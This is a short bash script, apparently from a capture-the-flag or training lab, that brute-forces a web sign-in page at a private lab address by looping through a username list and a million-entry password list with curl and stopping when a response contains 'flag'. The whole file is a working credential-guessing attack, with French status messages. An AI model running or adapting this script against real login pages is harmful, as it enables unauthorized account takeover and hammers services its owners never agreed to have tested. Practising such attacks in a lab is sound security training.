URL="http://192.168.56.106/?page=signin"
USERFILE="bruteforce-database/38650-username-sktorrent.txt"
PASSFILE="bruteforce-database/1000000-password-seclists.txt"

while read -r username; do
  while read -r password; do

    response=$(curl -s "$URL&username=$username&password=$password&Login=Login#")

    echo "$response" | grep -q "flag"
    if [ $? -eq 0 ]; then
      echo "TROUVÉ : $username / $password"
      echo
      echo "Contenu de la réponse :"
      echo "$response"
      exit 0
    fi

  done < "$PASSFILE"
done < "$USERFILE"

echo "pas de correspondance"
